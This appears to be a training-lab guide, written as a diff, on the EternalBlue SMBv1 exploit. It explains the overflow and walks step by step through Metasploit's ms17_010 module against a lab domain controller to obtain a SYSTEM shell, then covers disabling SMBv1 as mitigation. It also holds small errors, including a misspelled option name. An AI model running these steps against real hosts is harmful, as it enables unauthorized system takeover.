@@ -1,0 +1,31 @@
+Main Information
+EternalBlue is an exploit that takes advantage of a vulnerability in the Server Message Block(SMB) Protocol version 1 allowing attackers to execute arbitrary code on vulnerable systems. EternalBlue is the name of the exploit, the related vulnerabilities are CVE-2017-0144 and MSB-MS17-010.
+
+Mechanics:
+EternalBlue takes advantage of a buffer overflow when a specific memmove operation(Srv!SrvOs2FeaToNt) is executed. When Srv!SrvOs2FeaToNt is run a DWORD(a 32-bit integer) is subtracted and put into a WORD(a 16-bit integer). Due to the layout of the kernel memory pool, this operation will overwrite an SMBv1 buffer causing the overflow. After the buffer is overflowed, a hijack can be completed using a separate operation(srvnet!SrvNetWskReceiveComplete).
+
+Practice: 
+Example: This example demonstrates the severity of EternalBlue on Domain-Controller.
+
+1. Log into Security-Desk with the standard credentials and open a terminal.
+2. Once in the terminal run the command msfconsole to interact with the Metasploit Framework(MSF).
+3. After the framework has loaded, your prompt will change to read msf6>. You're going to instruct msfconsole to use the exploit EternalBlue by running in the following: use exploit/windows/smb/ms17_010_eternalblue_win8
+4. You will then see your prompt has changed to reflect the exploit you just selected msf exploit(ms17_010_eternalblue_win8) >
+5. You can now run show options to list out the selected exploit's possible settings, however, for simplicity’s sake, we are just going to set the target server IP address and the target port.
+6. Begin by running the command set RHOST 172.16.30.5. Doing so will point the exploit at the Domain-Controller Server. You can run show options again and see that the “RHOSTS” setting has now changed to the IP address you gave it.
+7. After completing the step listed above run the command set rport 445 which points the exploit at the default port for SMB. This setting may already be correct by default.
+8. Once you have completed setting up the target information for the exploit, run the command exploit. This will launch the attack and when successful the exploit will attempt to return a windows meterpreter shell from the target (Domain-Controller) server. This can be confirmed by noticing the change in the prompt to “meterpreter >"
+9. You can then run the meterpreter command “shell” to receive an elevated command shell. To confirm you can run the command “whoami “within the windows command shell to return the current domain and user name (nt authority\system).
+10. When you're finished inside the windows command shell you can input Control + C to exit the shell and return to the meterpreter prompt. Type in the word “exit” to return to msfconsole.
+What to do in case of stop errors?
+Run at higher level of "GrooomAllocations" and runnining it multiple times
+
+Suggested Fix:
+
+Microsoft has released a patch for this vulnerability. Normally, you would update your computer via windows update. However, for the sake of this demonstration, you can turn off the SMBv1 Service by running the following PowerShell command on the Domain Controller…
+
+Set-SMBServerConfiguration -EnableSMB1Protocol $false
+
+You will be prompted with a confirmation of performing the operation “Modify” on the target “SMB Server Configuration.” Simply input the letter “Y” and hit enter to apply the change. If you would like to test the fix, simply run the previous command, and attempt the attack again.
+
+You should notice that running the attack again will report that an “Error occurred while reading from remote.” indicating that the server is no longer vulnerable to the EternalBlue exploit. However, this should be seen as a temporary mitigation and the service should be re-enabled once proper updates are applied.
